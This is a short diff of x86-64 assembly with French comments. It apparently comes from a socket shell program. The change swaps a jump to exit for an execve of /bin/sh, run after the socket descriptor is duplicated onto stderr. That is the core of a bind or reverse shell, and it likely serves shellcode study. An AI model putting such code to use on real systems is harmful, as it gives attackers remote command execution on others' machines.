@@ -84,7 +84,13 @@ _start:
     mov rdi, [sockfd]
     mov rsi, 2             ; STDERR = 2
     syscall
-    jmp exit
+
+    ; exec du shell
+    mov rax, SYS_EXECVE
+    lea rdi, [shell]       ; chemin vers /bin/sh
+    lea rsi, [args]        ; arguments (aucun)
+    lea rdx, [env]         ; variables d'environnement (aucune)
+    syscall
 
 socket_error:
     ; ERROR
